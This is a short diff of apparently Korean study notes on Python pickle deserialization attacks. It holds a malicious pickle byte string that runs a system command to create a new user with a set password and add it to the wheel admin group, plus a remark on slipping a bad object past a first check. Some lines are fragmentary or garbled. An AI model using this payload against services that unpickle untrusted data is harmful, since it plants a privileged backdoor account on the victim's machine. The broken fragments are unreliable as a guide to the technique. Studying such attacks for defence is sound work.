@@ -15,7 +15,7 @@ pickle 역직렬화 공격
 objects = [SafeObject(), BadObject()]  
 첫 검사 로직 우회  
 
-malicious_pickle_data = b'(cos\nsystem\nS"useradd -m -p $(openssl passwd -1 secui) secuiTestAccount && usermod -aG wheel secuiTestAccount"\no.  
+malicious_pickle_data = b'(cos\nsystem\nS"useradd -m -p $(openssl passwd -1 test1) TestAccount && usermod -aG wheel TestAccount"\no.  
 문자열로 삽입
 
 (U\2idios\nsystem\n.  
